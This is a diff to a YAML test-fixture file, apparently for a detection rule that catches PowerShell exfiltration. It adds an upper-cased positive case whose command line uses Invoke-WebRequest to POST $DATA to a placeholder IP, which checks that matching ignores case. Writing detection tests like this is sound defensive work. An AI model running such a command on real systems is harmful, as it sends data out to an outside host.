@@ -35,3 +35,10 @@ negative:
     <<: *ev
     process.name: cmd.exe
     process.command_line: cmd.exe /c echo Invoke-WebRequest http://x -Method POST -Body a
+recased_positive:
+- name: "upper-case -METHOD POST -BODY"
+  event:
+    <<: *ev
+    process.name: "POWERSHELL.EXE"
+    process.command_line: "POWERSHELL.EXE -C \"INVOKE-WEBREQUEST -URI HTTP://203.0.113.9/UP -METHOD POST -BODY $DATA\""
+    process.parent.name: "CMD.EXE"
